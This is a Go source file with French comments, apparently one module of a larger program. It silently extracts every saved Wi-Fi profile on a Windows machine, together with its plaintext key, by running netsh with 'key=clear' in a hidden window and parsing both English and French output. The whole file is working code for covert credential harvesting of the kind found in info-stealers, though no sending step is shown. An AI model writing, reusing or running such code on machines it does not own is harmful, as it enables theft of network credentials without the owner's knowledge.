// wifi.go — extraction des mots de passe WiFi (profils WLAN).
//
// netsh est localisé : la même commande rend « All User Profile » en anglais
// et « Profil Tous les utilisateurs » en français. Le découpage se fait donc
// sur la forme « libellé : valeur » et sur des fragments de libellé communs
// aux deux langues, jamais sur une ligne entière.
package main

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// netshField rend la valeur située après le « : » d'une ligne dont le libellé
// contient l'un des fragments donnés.
func netshField(line string, fragments ...string) (string, bool) {
	i := strings.Index(line, ":")
	if i < 0 {
		return "", false
	}
	label := strings.ToLower(strings.TrimSpace(line[:i]))
	for _, f := range fragments {
		if strings.Contains(label, f) {
			return strings.TrimSpace(line[i+1:]), true
		}
	}
	return "", false
}

// wifiReport liste tous les profils WiFi et leurs clés en clair.
func wifiReport() string {
	out, err := runNetSH("wlan", "show", "profiles")
	if err != nil {
		return "erreur netsh profiles : " + err.Error()
	}
	var profiles []string
	for _, line := range strings.Split(out, "\n") {
		// « Profil Tous les utilisateurs : Xiaomi Pad 8 Pro »
		// « All User Profile : Xiaomi Pad 8 Pro »
		if v, ok := netshField(line, "profil", "profile"); ok {
			if v == "" || strings.HasPrefix(v, "<") {
				continue
			}
			profiles = append(profiles, v)
		}
	}
	if len(profiles) == 0 {
		return "aucun profil WiFi enregistré sur cette machine."
	}

	var b strings.Builder
	b.WriteString(fmt.Sprintf("%d profil(s) WiFi :\n", len(profiles)))
	for _, p := range profiles {
		key := wifiGetKey(p)
		fmt.Fprintf(&b, "  SSID : %s\n    clé : %s\n", p, key)
	}
	return b.String()
}

// wifiGetKey demande la clé en clair d'un profil.
func wifiGetKey(ssid string) string {
	out, err := runNetSH("wlan", "show", "profile", "name="+ssid, "key=clear")
	if err != nil {
		return "erreur"
	}
	for _, line := range strings.Split(out, "\n") {
		if v, ok := netshField(line, "key content", "contenu de la cl"); ok {
			if v == "" {
				return "(vide)"
			}
			return v
		}
	}
	return "(réseau ouvert ou clé absente)"
}

// runNetSH lance netsh sans console visible.
func runNetSH(args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	c := exec.CommandContext(ctx, "netsh.exe", args...)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := c.Output()
	return decodeConsole(out), err
}
